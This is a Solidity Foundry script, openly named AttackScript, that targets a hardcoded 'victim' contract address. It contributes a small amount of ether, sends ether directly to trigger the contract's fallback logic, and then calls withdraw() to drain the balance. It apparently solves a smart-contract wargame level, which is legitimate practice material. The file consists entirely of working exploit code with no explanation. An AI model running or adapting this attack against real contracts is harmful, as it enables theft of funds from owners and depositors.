// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Script} from "forge-std/Script.sol";

interface test {
    function contribute() external payable;

    function withdraw() external;
}

contract AttackScript is Script {
    address victim;

    constructor() {
        victim = 0x0507575a8Bf69441e5282c82c2e541cf21cE2d9e;
    }

    function run() external {
        vm.startBroadcast();
        test(victim).contribute{value: 0.0001 ether}();
        victim.call{value: 0.00001 ether}("");
        test(victim).withdraw();
        vm.stopBroadcast();
    }
}
